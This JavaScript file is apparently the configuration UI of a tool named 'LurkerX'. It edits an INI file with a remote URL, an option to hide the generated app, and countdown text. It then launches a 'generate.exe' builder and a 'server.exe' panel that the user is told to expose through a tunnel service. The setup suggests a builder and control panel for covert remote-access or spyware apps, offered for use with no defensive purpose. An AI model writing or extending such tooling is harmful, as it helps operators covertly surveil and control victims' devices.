const loader = document.getElementById("overlayLoader");

function showLoader(text = "Working…") {
    loader.querySelector(".loader-text").innerText = text;
    loader.classList.remove("hidden");
}

function hideLoader() {
    setTimeout(() => {
        loader.classList.add("hidden");
    }, 500);
}

async function updateIniFromUI() {
    showLoader("Updating config...");
    const visibility =
        document.querySelector('input[name="visibility"]:checked')?.value;

    const updatedIni = {
        app: {
            name: document.getElementById("username").value.trim()
        },
        behavior: {
            remoteurl: document.getElementById("url").value.trim(),
            hideapp: visibility
        },
        content: {
            countdowntext: document.getElementById("countdowntext").value.trim()
        }
    };

    window.parent.postMessage({
        action: "update_ini",
        path: "tools/LurkerX/choices.ini",
        data: updatedIni
    }, "*");
}

const statusEl = document.getElementById("status");

function requestConfig() {
    showLoader("Loading configuration…");

    window.parent.postMessage({
        action: "get_ini",
        path: "tools/LurkerX/choices.ini"
    }, "*");
}


window.addEventListener("message", (event) => {
    const msg = event.data;

    if (msg.action === "get_ini_result") {
        if (!msg.success) {
            statusEl.innerText = "Failed to load config";
            console.error(msg.error);
            hideLoader();
            return;
        }

        const cfg = msg.data;
        document.getElementById("username").value =
            cfg.app?.name || "";
        document.getElementById("url").value =
            cfg.behavior?.remoteurl || "";
        document.getElementById("countdowntext").value =
            cfg.content?.countdowntext || "";
        if (cfg.behavior?.hideapp !== undefined) {
            const val = String(cfg.behavior.hideapp);
            const radio = document.querySelector(
                `input[name="visibility"][value="${val}"]`
            );
            if (radio) radio.checked = true;
        }

        statusEl.innerText = "Config loaded from INI";
        hideLoader();
    }

    if (msg.action === "tool_done") {
        alert(msg.message || "Done!");
        hideLoader();
        if (msg.from == "server.exe") {setTimeout(() => {location.href = "http://127.0.0.1:5000"}, 500);}
    }
});

window.addEventListener("DOMContentLoaded", requestConfig);
document.querySelectorAll(".button").forEach(btn => {
    btn.addEventListener("click", async (e) => {
        showLoader("Processing…");
        if (e.target.id === "downloadJBtn") {
            window.parent.postMessage({
                action: "open_link",
                url: "https://download.visualstudio.microsoft.com/download/pr/0961d2f1-2853-4396-978f-358b5c564cce/542c0fe6ed499f4bb31393d48addb261/microsoft-jdk-17.0.17-windows-x64.exe"
            }, "*");
        }
        else if (e.target.id === "generateBtn") {
            await updateIniFromUI();
            showLoader("Make sure your Java is already installed before this starts");
            window.parent.postMessage({
                action: "run_binary",
                tool: "LurkerX",
                binary: "generate.exe",
                minimized: false,
                args: ["--token", "token"]
            }, "*");
        }
        else if (e.target.id === "openPanelBtn") {
            showLoader("Make sure your Tunnel (localtonet, localxpose, etc.) is running before this starts");
            window.parent.postMessage({
                action: "run_binary",
                tool: "LurkerX",
                binary: "server.exe",
                minimized: true,
                args: ["--token", "value"]
            }, "*");
        }
    });

});